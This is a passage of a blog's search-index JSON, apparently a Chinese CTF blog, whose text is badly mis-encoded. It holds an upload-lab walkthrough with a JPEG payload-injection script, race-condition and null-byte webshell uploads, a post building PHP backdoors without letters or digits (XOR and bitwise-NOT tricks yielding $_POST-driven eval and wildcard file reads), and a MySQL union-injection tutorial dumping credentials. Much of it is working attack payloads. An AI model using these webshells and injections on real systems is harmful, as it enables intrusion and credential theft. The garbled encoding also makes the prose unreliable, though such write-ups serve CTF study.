wrong&#39;);function checkImage($filename, $data, $unlink &#x3D; FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage &#x3D; TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage;&#125;function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage &#x3D; FALSE; if(preg_match(&#39;&#x2F;(\\d+) extraneous bytes before marker&#x2F;&#39;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes &#x3D; (int)$m[1]; &#125; &#125;&#125;class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order &#x3D; false, $fromString &#x3D; false) &#123; $this-&gt;binData &#x3D; &#39;&#39;; $this-&gt;order &#x3D; $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#39;File not exists [&#39;.$filename.&#39;]&#39;); $this-&gt;binData &#x3D; file_get_contents($filename); &#125; else &#123; $this-&gt;binData &#x3D; $filename; &#125; $this-&gt;size &#x3D; strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData &#x3D; substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#39;End Of File&#39;); &#125; $byte &#x3D; substr($this-&gt;binData, 0, 1); $this-&gt;binData &#x3D; substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#39;End Of File&#39;); &#125; $short &#x3D; substr($this-&gt;binData, 0, 2); $this-&gt;binData &#x3D; substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short &#x3D; (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short &#x3D; (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) &#x3D;&#x3D;&#x3D; 0); &#125;&#125;?&gt; ä½¿ç”¨æ–¹æ³•ï¼š éšä¾¿æ‰¾ä¸€ä¸ªjpgå›¾ç‰‡,å…ˆä¸Šä¼ è‡³æœåŠ¡å™¨ç„¶åå†ä¸‹è½½åˆ°æœ¬åœ°ä¿å­˜ä¸º1.jpgï¼Œ ä½¿ç”¨è„šæœ¬å¤„ç†1.jpg,å‘½ä»¤php jpg_payload.php 1.jpg éœ€è¦æ³¨æ„çš„æ˜¯,æœ‰ä¸€äº›jpgå›¾ç‰‡ä¸èƒ½è¢«å¤„ç†,æ‰€ä»¥è¦å¤šå°è¯•ä¸€äº›jpgå›¾ç‰‡ Pass-17è€ƒå¯Ÿç‚¹ï¼šç«äº‰ä¸Šä¼  é€šå…³æ–¹æ³•ï¼š è¿™é‡Œå…ˆå°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡renameä¿®æ”¹åç§°ï¼Œå†é€šè¿‡unlinkåˆ é™¤æ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ¡ä»¶ç«äº‰çš„æ–¹å¼åœ¨unlinkä¹‹å‰ï¼Œè®¿é—®webshellã€‚é¦–å…ˆåœ¨burpä¸­ä¸æ–­å‘é€ä¸Šä¼ webshellçš„æ•°æ®åŒ…ï¼š ç„¶åä¸æ–­åœ¨æµè§ˆå™¨ä¸­è®¿é—®ï¼Œå‘ç°é€šè¿‡ç«äº‰å¯ä»¥è®¿é—®åˆ°ï¼š Pass-18è€ƒå¯Ÿç‚¹ï¼šç«äº‰ä¸Šä¼ +ç™½åå• é€šå…³æ–¹æ³•ï¼š æœ¬å…³å¯¹æ–‡ä»¶åç¼€ååšäº†ç™½åå•åˆ¤æ–­ï¼Œç„¶åä¼šä¸€æ­¥ä¸€æ­¥æ£€æŸ¥æ–‡ä»¶å¤§å°ã€æ–‡ä»¶æ˜¯å¦å­˜åœ¨ç­‰ç­‰ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åï¼Œå¯¹æ–‡ä»¶é‡æ–°å‘½åï¼ŒåŒæ ·å­˜åœ¨æ¡ä»¶ç«äº‰çš„æ¼æ´ã€‚å¯ä»¥ä¸æ–­åˆ©ç”¨burpå‘é€ä¸Šä¼ å›¾ç‰‡é©¬çš„æ•°æ®åŒ…ï¼Œç”±äºæ¡ä»¶ç«äº‰ï¼Œç¨‹åºä¼šå‡ºç°æ¥ä¸åŠrenameçš„é—®é¢˜ï¼Œä»è€Œä¸Šä¼ æˆåŠŸï¼š Pass-19è€ƒå¯Ÿç‚¹ï¼š00æˆªæ–­ é€šå…³æ–¹æ³•ï¼š æœ¬å…³è€ƒå¯ŸCVE-2015-2348 move_uploaded_file() 00æˆªæ–­ï¼Œä¸Šä¼ webshellï¼ŒåŒæ—¶è‡ªå®šä¹‰ä¿å­˜åç§°ï¼Œç›´æ¥ä¿å­˜ä¸ºphpæ˜¯ä¸è¡Œçš„ æŸ¥çœ‹ä»£ç ï¼Œå‘ç°move_uploaded_file()å‡½æ•°ä¸­çš„img_pathæ˜¯ç”±postå‚æ•°save_nameæ§åˆ¶çš„ï¼Œå› æ­¤å¯ä»¥åœ¨save_nameåˆ©ç”¨00æˆªæ–­ç»•è¿‡ï¼š Pass-20è€ƒå¯Ÿç‚¹ï¼š é€šå…³æ–¹æ³•ï¼š","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"http://www.m00nback.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"æ— å­—æ¯æ•°å­—webshell","slug":"nowords-webshell","date":"2019-10-16T13:24:01.000Z","updated":"2020-04-20T06:34:36.334Z","comments":true,"path":"2019/10/16/nowords-webshell/","link":"","permalink":"http://www.m00nback.xyz/2019/10/16/nowords-webshell/","excerpt":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†æ„é€ æ— å­—æ¯æ•°å­—webshellçš„ä¸€äº›æ–¹æ³•ï¼","text":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†æ„é€ æ— å­—æ¯æ•°å­—webshellçš„ä¸€äº›æ–¹æ³•ï¼ ä¸€é“æœ‰æ„æ€çš„é¢˜12345678910111213141516&lt;?phpinclude &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;]))&#123; $code &#x3D; $_GET[&#39;code&#39;]; if(strlen($code)&gt;40)&#123; die(&quot;Long.&quot;); &#125; if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;&#x2F;&#x2F;$hint &#x3D; &quot;php function getFlag() to get flag&quot;;?&gt; åˆ†æä»£ç å¯çŸ¥åªè¦æ‰§è¡ŒgetFlag()å‡½æ•°åº”è¯¥å°±å¯ä»¥å¾—åˆ°flagäº† ä½†å¯¹codeçš„é•¿åº¦é™åˆ¶&lt;40,å¹¶ä¸”codeä¸èƒ½æœ‰æ•°å­—å’Œå¤§å°å†™å­—æ¯ æ–¹å¼1(å¼‚æˆ–è¿ç®—)å…ˆè§£é‡Šä¸‹å¼‚æˆ–è¿ç®— åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå˜é‡è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œå…ˆä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆäºŒè¿›åˆ¶å†è¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–å®Œï¼Œåˆå°†ç»“æœä»äºŒè¿›åˆ¶è½¬æ¢æˆäº†ASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚å¼‚æˆ–æ“ä½œæœ‰æ—¶ä¹Ÿè¢«ç”¨æ¥äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š Açš„ASCIIå€¼æ˜¯65ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶å€¼æ˜¯01000001 ?çš„ASCIIå€¼æ˜¯63ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶å€¼æ˜¯00111111 å¼‚æˆ–çš„äºŒè¿›åˆ¶çš„å€¼æ˜¯01111110ï¼Œå¯¹åº”çš„ASCIIå€¼æ˜¯126ï¼Œå¯¹åº”çš„å­—ç¬¦ä¸²çš„å€¼å°±æ˜¯~äº† æˆ‘ä»¬éƒ½çŸ¥é“ï¼ŒPHPæ˜¯å¼±ç±»å‹çš„è¯­è¨€ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨PHPä¸­æˆ‘ä»¬å¯ä»¥ä¸é¢„å…ˆå£°æ˜å˜é‡çš„ç±»å‹ï¼Œè€Œç›´æ¥å£°æ˜ä¸€ä¸ªå˜é‡å¹¶è¿›è¡Œåˆå§‹åŒ–æˆ–èµ‹å€¼æ“ä½œã€‚æ­£æ˜¯ç”±äºPHPå¼±ç±»å‹çš„è¿™ä¸ªç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯¹PHPçš„å˜ç±»å‹è¿›è¡Œéšå¼çš„è½¬æ¢ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹è¿›è¡Œä¸€äº›éå¸¸è§„çš„æ“ä½œã€‚å¦‚å°†æ•´å‹è½¬æ¢æˆå­—ç¬¦ä¸²å‹ï¼Œå°†å¸ƒå°”å‹å½“ä½œæ•´å‹ï¼Œæˆ–è€…å°†å­—ç¬¦ä¸²å½“ä½œå‡½æ•°æ¥å¤„ç†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€æ®µä»£ç ï¼š 12345678&lt;?php function B()&#123; echo &quot;Hello Angel_Kitty&quot;; &#125; $_++; $__&#x3D; &quot;?&quot; ^ &quot;&#125;&quot;; $__();?&gt; æˆ‘ä»¬ä¸€èµ·æ¥åˆ†æä¸€ä¸‹ä¸Šé¢è¿™æ®µä»£ç ï¼š $_++;è¿™è¡Œä»£ç çš„æ„æ€æ˜¯å¯¹å˜é‡åä¸º&quot;_&quot;çš„å˜é‡è¿›è¡Œè‡ªå¢æ“ä½œï¼Œåœ¨PHPä¸­æœªå®šä¹‰çš„å˜é‡é»˜è®¤å€¼ä¸ºnull,null==false==0,æˆ‘ä»¬å¯ä»¥åœ¨ä¸ä½¿ç”¨ä»»ä½•æ•°å­—çš„æƒ…å†µä¸‹,é€šè¿‡å¯¹æœªå®šä¹‰å˜é‡çš„è‡ªå¢æ“ä½œæ¥å¾—åˆ°ä¸€ä¸ªæ•°å­—ã€‚ $__=&quot;?&quot; ^ &quot;&#125;&quot;;å¯¹å­—ç¬¦â€?â€å’Œâ€&#125;â€è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°ç»“æœBèµ‹ç»™å˜é‡åä¸ºâ€__â€(ä¸¤ä¸ªä¸‹åˆ’çº¿)çš„å˜é‡ $ __ ();é€šè¿‡ä¸Šé¢çš„èµ‹å€¼æ“ä½œï¼Œå˜é‡$__çš„å€¼ä¸ºBï¼Œæ‰€ä»¥è¿™è¡Œå¯ä»¥çœ‹ä½œæ˜¯B(),åœ¨PHPä¸­,è¿™è¡Œä»£ç è¡¨ç¤ºè°ƒç”¨å‡½æ•°B,æ‰€ä»¥æ‰§è¡Œç»“æœä¸ºHello Angel_Kittyã€‚åœ¨PHPä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†å­—ç¬¦ä¸²å½“ä½œå‡½æ•°æ¥å¤„ç†ã€‚ ä¸‹é¢æ˜¯ä¸ªéå¸¸ç®€å•çš„éæ•°å­—å­—æ¯çš„PHPåé—¨ï¼š 123456789&lt;?php @$_++; &#x2F;&#x2F; $_ &#x3D; 1 $__&#x3D;(&quot;#&quot;^&quot;|&quot;); &#x2F;&#x2F; $__ &#x3D; _ $__.&#x3D;(&quot;.&quot;^&quot;~&quot;); &#x2F;&#x2F; _P $__.&#x3D;(&quot;&#x2F;&quot;^&quot;&#96;&quot;); &#x2F;&#x2F; _PO $__.&#x3D;(&quot;|&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POS $__.&#x3D;(&quot;&#123;&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POST $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); &#x2F;&#x2F; $_POST[0]($_POST[1]);?&gt; _POSTçš„æ‹¼æ¥å¯ä»¥å°†ä¸Šé¢çš„ä»£ç åˆå¹¶ä¸ºä¸€è¡Œï¼Œä»è€Œä½¿ç¨‹åºçš„å¯è¯»æ€§æ›´å·®ï¼Œä»£ç å¦‚ä¸‹ï¼š $__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;); æˆ–è€… $__=&quot;#./|&#123;&quot;^&quot;|~`//&quot;; æ³¨æ„#çš„urlç¼–ç ï¼Œå¦åˆ™ä¼šç›¸å½“äºæ³¨é‡Š åŒæ ·_GETä¹Ÿå¯ä»¥è¿™æ ·æ‹¼æ¥ $__=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot; æŒ‰ç…§è¿™ç§æ–¹æ³•ï¼Œå¯å¾—payload ?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=getFlag ?code=$_=&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_(); //$_=&#39;getFlag&#39; ?code=$å•Š=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$å•Š(); ç›¸å½“äº $å•Š=getFlag;$å•Š(); è¿™é‡Œå°±ä¸éœ€è¦ç”¨ &#123;&#125; äº†ï¼Œå› ä¸ºå–åçš„å€¼ç›´æ¥è¢«å½“ä½œå­—ç¬¦ä¸²èµ‹å€¼ç»™äº† $ å•Š æ–¹å¼2(å–åè¿ç®—)ä¸»è¦åŸç†ï¼š åˆ©ç”¨çš„æ˜¯UTF-8ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå°†å…¶ä¸­æŸä¸ªå­—ç¬¦å–å‡ºæ¥å–å æ¯”å¦‚&quot;å’Œ&quot;[2]çš„ç»“æœæ˜¯&quot;\\x8c&quot;ï¼Œå…¶å–åå³ä¸ºå­—æ¯s 123456&gt;&gt;&gt; print(&quot;å’Œ&quot;.encode(&#39;utf8&#39;))b&#39;\\xe5\\x92\\x8c&#39;&gt;&gt;&gt; print(&quot;å’Œ&quot;.encode(&#39;utf8&#39;)[2])140&gt;&gt;&gt; print(~&quot;å’Œ&quot;.encode(&#39;utf8&#39;)[2])-141 ä¸¾ä¸ªä¾‹å­ï¼š 123456789101112131415161718192021222324252627282930&lt;?php$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;); &#x2F;&#x2F;$__&#x3D;2$_&#x3D;$__&#x2F;$__; &#x2F;&#x2F;$_&#x3D;1$____&#x3D;&#39;&#39;;$___&#x3D;&quot;ç°&quot;;$____.&#x3D;~($___&#123;$_&#125;); &#x2F;&#x2F;$____&#x3D;&#39;a&#39;$___&#x3D;&quot;å’Œ&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;å’Œ&quot;;$____.&#x3D;~($___&#123;$__&#125;); &#x2F;&#x2F;$____&#x3D;&#39;as&#39;$___&#x3D;&quot;çš„&quot;;$____.&#x3D;~($___&#123;$_&#125;); &#x2F;&#x2F;$____&#x3D;&#39;ass&#39;$___&#x3D;&quot;åŠ&quot;;$____.&#x3D;~($___&#123;$_&#125;); &#x2F;&#x2F;$____&#x3D;&#39;asse&#39;$___&#x3D;&quot;å§‹&quot;;$____.&#x3D;~($___&#123;$__&#125;); &#x2F;&#x2F;$____&#x3D;&#39;assert&#39;$_____&#x3D;&#39;_&#39;;$___&#x3D;&quot;ä¿¯&quot;;$_____.&#x3D;~($___&#123;$__&#125;); &#x2F;&#x2F;$_____&#x3D;&#39;_P&#39;$___&#x3D;&quot;ç°&quot;;$_____.&#x3D;~($___&#123;$__&#125;); &#x2F;&#x2F;$_____&#x3D;&#39;_PO&#39;$___&#x3D;&quot;æ¬¡&quot;;$_____.&#x3D;~($___&#123;$_&#125;); &#x2F;&#x2F;$_____&#x3D;&#39;_POS&#39;$___&#x3D;&quot;ç«™&quot;;$_____.&#x3D;~($___&#123;$_&#125;); &#x2F;&#x2F;$_____&#x3D;&#39;_POST&#39;$_&#x3D;$$_____; &#x2F;&#x2F;$_&#x3D;$_POST$____($_[$__]); è¿™é‡Œä¹Ÿæœ‰ä¸€ç§ç®€çŸ­çš„å†™æ³•$&#123;~&quot;\\xa0\\xb8\\xba\\xab&quot;&#125;å®ƒç­‰äº$_GETã€‚è¿™é‡Œç›¸å½“äºç›´æ¥æŠŠutf8ç¼–ç çš„æŸä¸ªå­—èŠ‚æå–å‡ºæ¥ç»Ÿä¸€è¿›è¡Œå–åã€‚ é‚£éº½åˆ©ç”¨è¿™ç§æ–¹å¼å¯å¾—payload ?code=$_=~%98%9A%8B%B9%93%9E%98;$_(); //%_ä¸ºgetFlagå–åç„¶åURLç¼–ç å¾—ç»“æœ æˆ– ?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag æ‹¼æ¥å‡ºäº† $_GETâ€˜+â€™;ï¼Œä¼ å…¥ +=getFlag() ä»è€Œæ‰§è¡Œäº†å‡½æ•° æ³¨æ„ç‚¹ï¼š php5å’Œphp7æ˜¯æœ‰åŒºåˆ«çš„ PHP7å‰æ˜¯ä¸å…è®¸ç”¨($a)();è¿™æ ·çš„æ–¹æ³•æ¥æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„ï¼Œä½†PHP7ä¸­å¢åŠ äº†å¯¹æ­¤çš„æ”¯æŒã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡(&#39;phpinfo&#39;)();æ¥æ‰§è¡Œå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·ä¸­å¯ä»¥æ˜¯ä»»æ„PHPè¡¨è¾¾å¼ã€‚ å‡çº§ç‰ˆå‡çº§ç‰ˆå¢åŠ äº†å¯¹_å’Œ$çš„è¿‡æ»¤ï¼Œä½†è¿˜æ˜¯æœ‰æ–¹æ³•ç»•è¿‡çš„ 12345678910111213&lt;?phpif(isset($_GET[&#39;code&#39;]))&#123; $code &#x3D; $_GET[&#39;code&#39;]; if(strlen($code)&gt;35)&#123; die(&quot;Long.&quot;); &#125; if(preg_match(&quot;&#x2F;[A-Za-z0-9_$]+&#x2F;&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; eval($code);&#125;else&#123; highlight_file(__FILE__);&#125; è§£é¢˜æ–¹æ³•è¿™é“é¢˜åˆšå¥½æ˜¯åœ¨linuxç³»ç»Ÿä¸Šï¼Œå¹¶ä¸”å¼€å¯äº†çŸ­æ ‡ç­¾ åœ¨linuxç³»ç»Ÿä¸­ï¼Œæ˜¯æ”¯æŒæ­£åˆ™çš„ï¼ŒæŸäº›ä½ å¿˜è®°æŸä¸ªå­—ç¬¦æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥ä½¿ç”¨? * %ç­‰å­—ç¬¦æ¥æ›¿ä»£ï¼Œå½“ç„¶è¿™é‡Œæƒ³è¦æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦æé™çš„åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œç»è¿‡æµ‹è¯•ï¼š ???/??? =&gt; /bin/cat PHPå¼€å¯çŸ­æ ‡ç­¾å³short_open_tag=onæ—¶ï¼Œå¯ä»¥ä½¿ç”¨&lt;?=$_?&gt;è¾“å‡ºå˜é‡äºæ˜¯è¯»æºç ï¼š $_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt; &quot;/bin/cat /var/www/html/index.php&quot; é•¿åº¦è¶…å‡ºä¸Šé™ï¼Œä½¿ç”¨é€šé…ï¼š $_=/???/???%20/???/???/????/;?&gt;&lt;?=$_?&gt; æ­£åˆ™è¿‡æ»¤äº†$å’Œ_,æ”¹è¿›ä¸ºï¼š ?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt; å¯ä»¥è¯»åˆ°ï¼š 1234function getFlag()&#123; $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;); echo $flag;&#125; ç›´æ¥è¯»flagæ–‡ä»¶ ?&gt;&lt;?=`/???/???%20/????`;?&gt; å‚è€ƒï¼š https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"webshell","slug":"webshell","permalink":"http://www.m00nback.xyz/tags/webshell/"}]},{"title":"githubåšå®¢ä¼˜åŒ–","slug":"github-blog-domain","date":"2019-10-16T12:59:35.000Z","updated":"2019-10-16T13:04:26.877Z","comments":true,"path":"2019/10/16/github-blog-domain/","link":"","permalink":"http://www.m00nback.xyz/2019/10/16/github-blog-domain/","excerpt":"é—²æ¥æ— äº‹ï¼Œæäº†ä¸ªåŸŸåï¼Œè¯•è¯•æŠŠä¹°çš„åŸŸåè§£æåˆ°åšå®¢ä¸Šï¼","text":"é—²æ¥æ— äº‹ï¼Œæäº†ä¸ªåŸŸåï¼Œè¯•è¯•æŠŠä¹°çš„åŸŸåè§£æåˆ°åšå®¢ä¸Šï¼ github pagesç»‘å®šè‡ªå·±çš„åŸŸåä¿®æ”¹åŸŸåè§£ææˆ‘æ˜¯åœ¨è…¾è®¯äº‘ä¹°çš„åŸŸåï¼Œé˜¿é‡Œäº‘é…ç½®ä¹Ÿç±»ä¼¼ æ·»åŠ ä¸»æœºè®°å½•ä¸ºå­åŸŸåï¼ˆä¸èƒ½ä¸ºå…¨éƒ¨åŸŸåï¼Œè¿™é‡Œä¸ºblogï¼‰,è®°å½•ç±»å‹ä¸ºCNAME,è®°å½•å€¼ä¸ºåŸåšå®¢åœ°å€ ä¿®æ”¹githubé¡¹ç›®é…ç½®æ‰¾åˆ°åšå®¢é¡¹ç›®ï¼Œç„¶åSettingsï¼Œæ‰¾åˆ°Github Pages å°†Custom domainè®¾ç½®æˆè‡ªå·±çš„åŸŸåï¼ˆæ²¡æœ‰http://æˆ–https://ï¼‰ æ·»åŠ CNAMEæ–‡ä»¶åœ¨åšå®¢ç›®å½•sourceæ–‡ä»¶å¤¹é‡Œæ·»åŠ CNAMEæ–‡ä»¶ å†…å®¹å¡«å†™ä¸ºä½ è¦è®¾ç½®çš„åŸŸå ä¾‹å¦‚æˆ‘çš„ï¼š 1blog.moonback.xyz ç„¶å hexo g ,hexo då°±è¡Œäº† å¯èƒ½ä¸ä¼šé©¬ä¸Šè§£ææˆåŠŸï¼Œç­‰æ®µæ—¶é—´å°±å¥½","categories":[],"tags":[{"name":"åšå®¢","slug":"åšå®¢","permalink":"http://www.m00nback.xyz/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"æŠ˜è…¾","slug":"æŠ˜è…¾","permalink":"http://www.m00nback.xyz/tags/%E6%8A%98%E8%85%BE/"}]},{"title":"Mysqlæ³¨å…¥æ–¹æ³•","slug":"mysql-injection","date":"2019-10-16T07:29:43.000Z","updated":"2020-05-08T06:45:46.933Z","comments":true,"path":"2019/10/16/mysql-injection/","link":"","permalink":"http://www.m00nback.xyz/2019/10/16/mysql-injection/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†mysqlæ³¨å…¥çš„ä¸€äº›æ–¹æ³•ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†mysqlæ³¨å…¥çš„ä¸€äº›æ–¹æ³•ï¼ å¯ä»¥å›æ˜¾sqlé”™è¯¯çš„æ³¨å…¥è”åˆæŸ¥è¯¢å¿…äº†è§£çš„ä¸œè¥¿ï¼š æ•°æ®åº“information_schemaç”¨æ¥å­˜å‚¨å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„æ•°æ®åº“åç§°ï¼Œè¡¨åï¼Œå­—æ®µ SCHEMATAè¡¨ï¼šæä¾›äº†å½“å‰mysqlå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ å­—æ®µschemata_nameï¼šæ‰€æœ‰æ•°æ®åº“çš„åç§° TABLESè¡¨ï¼šæä¾›äº†å…³äºæ•°æ®åº“ä¸­çš„è¡¨çš„ä¿¡æ¯ï¼ˆåŒ…æ‹¬è§†å›¾ï¼‰ã€‚è¯¦ç»†è¡¨è¿°äº†æŸä¸ªè¡¨å±äºå“ªä¸ªschemaï¼Œè¡¨ç±»å‹ï¼Œè¡¨å¼•æ“ï¼Œåˆ›å»ºæ—¶é—´ç­‰ä¿¡æ¯ å­—æ®µtable_schemaï¼šæ‰€æœ‰æ•°æ®åº“çš„åç§°(é‡å¤ï¼‰ å­—æ®µtable_name:æ‰€æœ‰è¡¨çš„åç§° COLUMNSè¡¨ï¼šæä¾›äº†è¡¨ä¸­çš„åˆ—ä¿¡æ¯ã€‚è¯¦ç»†è¡¨è¿°äº†æŸå¼ è¡¨çš„æ‰€æœ‰åˆ—ä»¥åŠæ¯ä¸ªåˆ—çš„ä¿¡æ¯ã€‚ å­—æ®µtable_schemaï¼šæ‰€æœ‰æ•°æ®åº“çš„åç§°(é‡å¤ï¼‰ å­—æ®µtable_name:æ‰€æœ‰è¡¨çš„åç§°ï¼ˆé‡å¤ï¼‰ å­—æ®µcolumn_nameï¼šæ‰€æœ‰åˆ—çš„åç§° 1payload:ï¼Ÿid&#x3D;-1%27%20union%20select%20null,group_concat(schema_name),null%20from%20information_schema.schemata%23 â€‹ è§£é‡Šï¼šâ€‹ id=-1 æ˜¯ä¸ºäº†è®©ç½‘é¡µå›æ˜¾ä¸äº†å†…å®¹ï¼Œä»è€Œè®©è”åˆæŸ¥è¯¢çš„ç»“æœæ˜¾ç¤ºâ€‹ %27 å•å¼•å·â€™çš„urlç¼–ç ,é—­åˆidçš„å†…å®¹â€‹ %20 ä»£è¡¨ç©ºæ ¼çš„urlç¼–ç â€‹ union è”åˆæŸ¥è¯¢å­—ç¬¦â€‹ group_concat()å‡½æ•° å°†æŸ¥è¯¢çš„ç»“æœä¸€è¡Œæ˜¾ç¤ºâ€‹ null,group_concat(schema_name),null ä¸ªæ•°å–å†³äºç½‘é¡µæœ¬èº«æŸ¥è¯¢çš„å­—æ®µä¸ªæ•°â€‹ %23 #å·çš„urlç¼–ç ï¼Œå¯ä»¥ç”¨--%20ä»£æ›¿ï¼Œç”¨äºæ³¨é‡Šåé¢çš„sqlè¯­å¥ order bypayload: ?id=1&#39; order by 3%23 åˆ¤å½“å‰é¡µé¢æ•°æ®è¡¨å…±æœ‰å¤šå°‘åˆ— æ­¥éª¤ åˆ¤æ–­å›æ˜¾ä½ ?id=-1&#39; union select 1,2,3%23 çˆ†æ•°æ®åº“ ?id=-1%27%20union%20select%20null,group_concat(schema_name),null%20from%20information_schema.schemata%23 çˆ†è¡¨ ?id=-1&#39; union select null,group_concat(table_name),null from information_schema.tables where table_schema=database()%23 æˆ– ?id=-1&#39; union select null,group_concat(table_name),null from information_schema.tables where table_schema=&#39;xxxx&#39;%23 xxxä¸ºçˆ†å‡ºæ¥çš„æ•°æ®åº“å å‰ä¸¤ä¸ªæ­¥éª¤å¯ä»¥ç›´æ¥å†™æˆï¼š ?id=-1&#39; union select null,group_concat(schema_name),(select group_concat(table_name) from information_schema.tables where table_schema=database()) from information_schema.schemata%23 çˆ†å­—æ®µ ?id=-1&#39; union select null,group_concat(column_name),null from information_schema.columns where table_name=&#39;xxx&#39;%23 ?id=-1&#39; union select null,group_concat(column_name),null from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()%23 æœ€å¥½æ˜¯ç¬¬äºŒç§ï¼Œå¯¹æ•°æ®åº“é™åˆ¶ï¼Œé˜²æ­¢ä¸åŒæ•°æ®åº“æœ‰ç›¸åŒçš„è¡¨ çˆ†å†…å®¹ ?id=-1&#39; union select null,group_concat(username,0x23,password),null from security.users where id=2 %23 é‡ç‚¹ç†è§£åœ¨ä¸çŸ¥é“å¦‚ä½•æ„é€ payload,å¯ä»¥å…ˆè®©å…¶æŠ¥é”™ï¼Œæ ¹æ®æŠ¥é”™ä¿¡æ¯åˆ†ææ„é€  ç›®çš„ï¼š è®©ä¼ å‚å‰é¢çš„ç¬¦å·é—­åˆï¼Œä½¿åé¢çš„è”åˆæŸ¥è¯¢å½“æˆsqlè¯­å¥æ‰§è¡Œ ç›²æ³¨ä»€ä¹ˆæ˜¯ç›²æ³¨å‘¢ï¼Ÿ ç®€å•è¯´ï¼Œå½“æƒ³è¦å¾—åˆ°çš„æ•°æ®ä¿¡æ¯(æ¯”å¦‚æ•°æ®åº“åï¼Œè¡¨åï¼Œå­—æ®µåç­‰)æ— 